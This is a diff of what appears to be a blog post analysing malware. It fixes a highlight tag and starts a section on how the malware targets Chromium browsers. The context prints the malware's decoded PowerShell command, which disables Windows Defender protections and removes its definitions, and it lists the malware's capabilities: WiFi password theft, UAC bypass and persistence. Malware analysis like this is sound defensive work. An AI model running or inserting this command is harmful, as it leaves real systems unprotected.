@@ -276,7 +276,7 @@ which decodes to the script below. It essentially disables the [IPS (exploitatio
 
 {{< highlight powershell>}}
 powershell Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend && powershell Set-MpPreference -SubmitSamplesConsent 2 & "%ProgramFiles%\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
-{{ /highlight}}
+{{< /highlight >}}
 
 It can also extract WiFi passwords, setup a UAC bypass, embed itself in the startup applications and block websites.
 
@@ -290,4 +290,6 @@ It can also extract WiFi passwords, setup a UAC bypass, embed itself in the star
 
 ### How it targets browsers
 
-Due to the prevalence of Chromium (Brave, Chrome, Opera, ...)
+Due to the prevalence of Chromium (Brave, Chrome, Opera, ...) it mainly focuses on it. This would get a little long to describe with code snippets so to make it short I'll list it's capabilities with bullet points instead.
+
+- 
